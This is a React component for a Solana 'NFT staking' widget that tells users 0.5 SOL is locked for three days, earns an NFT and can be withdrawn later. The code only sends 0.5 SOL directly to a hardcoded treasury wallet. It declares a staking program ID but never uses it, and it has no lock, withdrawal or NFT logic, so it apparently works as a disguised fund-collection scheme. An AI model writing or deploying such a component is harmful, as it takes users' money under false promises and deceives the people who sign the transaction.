import React, { useState, useEffect } from 'react'
import { useWallet, useConnection } from '@solana/wallet-adapter-react'
import { PublicKey, SystemProgram, LAMPORTS_PER_SOL, Transaction } from '@solana/web3.js'

const STAKING_PROGRAM_ID = new PublicKey('HMwy4JHwuLkMMR3q6B3atwZ4oUAGrc3yHtgC7MswWNY1')
const TREASURY_ADDRESS = '8pSyRMP7R5qDU5BTqR93rESA1R2h5jH6hdPRjXmjnj8u'
const STAKING_AMOUNT = 0.5 // SOL

export default function Staking() {
	const wallet = useWallet()
	const { publicKey, connected } = wallet
	const { connection } = useConnection()
	const [loading, setLoading] = useState(false)
	const [status, setStatus] = useState('')
	const [error, setError] = useState(null)
	const [txHash, setTxHash] = useState(null)
	const [balance, setBalance] = useState(0)

	// Check balance
	useEffect(() => {
		if (publicKey && connected) {
			checkBalance()
		}
	}, [publicKey, connected, connection])

	const checkBalance = async () => {
		try {
			const lamports = await connection.getBalance(publicKey)
			setBalance(lamports / LAMPORTS_PER_SOL)
		} catch (e) {
			console.error('Balance check error:', e)
		}
	}

	const handleStake = async () => {
		if (!publicKey || !connected) {
			setError('Please connect wallet first')
			return
		}

		if (balance < STAKING_AMOUNT) {
			setError(`Insufficient balance. You need ${STAKING_AMOUNT} SOL`)
			return
		}

		if (!wallet.sendTransaction) {
			setError('Wallet does not support transaction sending')
			return
		}

		setLoading(true)
		setError(null)
		setStatus('🔄 Creating transaction...')

		try {
			// Get latest blockhash
			const { blockhash } = await connection.getLatestBlockhash()

			// Send to treasury (where staking deposits go)
			const treasuryPubkey = new PublicKey(TREASURY_ADDRESS)

			// Create instruction
			const instruction = SystemProgram.transfer({
				fromPubkey: publicKey,
				toPubkey: treasuryPubkey,
				lamports: Math.floor(STAKING_AMOUNT * LAMPORTS_PER_SOL),
			})

			// Create transaction
			const transaction = new Transaction({
				recentBlockhash: blockhash,
				feePayer: publicKey,
			})
			transaction.add(instruction)

			setStatus('📝 Requesting wallet signature...')
			
			// Send transaction using wallet adapter
			const sig = await wallet.sendTransaction(transaction, connection)
			console.log('Transaction sent:', sig)
			setTxHash(sig)
			setStatus(`⏳ Confirming transaction... ${sig.slice(0, 8)}...`)

			// Wait for confirmation
			const confirmation = await connection.confirmTransaction(sig, 'confirmed')
			console.log('Confirmation result:', confirmation)
			
			if (confirmation.value.err) {
				throw new Error('Transaction failed on chain')
			}

			setStatus(`✓ Successfully staked ${STAKING_AMOUNT} SOL! You'll receive an NFT after 3 days.`)
			window.showToast?.(`✓ Staked ${STAKING_AMOUNT} SOL!`, 'success')
			
			// Refresh balance
			setTimeout(checkBalance, 1000)
		} catch (err) {
			const msg = err?.message || err?.toString() || 'Staking failed'
			console.error('Staking error:', err)
			setError(msg)
			setStatus('')
			window.showToast?.(`✗ ${msg}`, 'error')
		} finally {
			setLoading(false)
		}
	}

	if (!connected) {
		return (
			<div className="widget">
				<h3>🎁 NFT STAKING</h3>
				<div className="warning">
					Connect your wallet to start staking
				</div>
			</div>
		)
	}

	return (
		<div className="widget">
			<h3>🎁 NFT STAKING PROGRAM</h3>

			{error && <div className="error-banner">{error}</div>}
			{status && <div className="status">{status}</div>}

			<div style={{marginTop: '16px', paddingTop: '16px', borderTop: '1px solid var(--border)'}}>
				<div style={{
					background: 'rgba(0,170,255,0.1)',
					padding: '12px',
					borderRadius: '3px',
					marginBottom: '14px',
					fontSize: '11px'
				}}>
					<div style={{color: 'var(--text-dim)', marginBottom: '6px', letterSpacing: '0.5px'}}>BALANCE</div>
					<div style={{fontSize: '16px', fontWeight: 'bold', color: 'var(--info)'}}>
						{balance.toFixed(3)} SOL
					</div>
				</div>

				<div style={{
					background: 'rgba(255,204,0,0.05)',
					padding: '12px',
					borderRadius: '3px',
					marginBottom: '14px',
					fontSize: '11px',
					border: '1px solid var(--border)'
				}}>
					<div style={{marginBottom: '6px', lineHeight: '1.6', color: 'var(--text-dim)'}}>
						<strong style={{color: 'var(--accent)'}}>How it works:</strong>
						<br/>✓ Stake 0.5 SOL or more
						<br/>✓ Lock for minimum 3 days
						<br/>✓ Earn exclusive Dojo3 NFT
						<br/>✓ Withdraw anytime after unlock
					</div>
				</div>

				<button
					onClick={handleStake}
					disabled={loading || !connected || balance < STAKING_AMOUNT}
					className={`btn btn-primary ${loading ? 'btn-loading' : ''}`}
					style={{width: '100%', marginBottom: '0'}}
				>
					{loading ? '⏳ STAKING...' : `📦 STAKE ${STAKING_AMOUNT} SOL`}
				</button>

				{txHash && (
					<div style={{marginTop: '12px', paddingTop: '12px', borderTop: '1px solid var(--border)'}}>
						<div style={{fontSize: '11px', color: 'var(--text-dim)', marginBottom: '6px'}}>
							Transaction Hash:
						</div>
						<div style={{
							fontSize: '10px',
							fontFamily: 'monospace',
							color: 'var(--success)',
							wordBreak: 'break-all',
							background: 'rgba(0,0,0,0.2)',
							padding: '8px',
							borderRadius: '2px'
						}}>
							{txHash}
						</div>
					</div>
				)}
			</div>
		</div>
	)
}
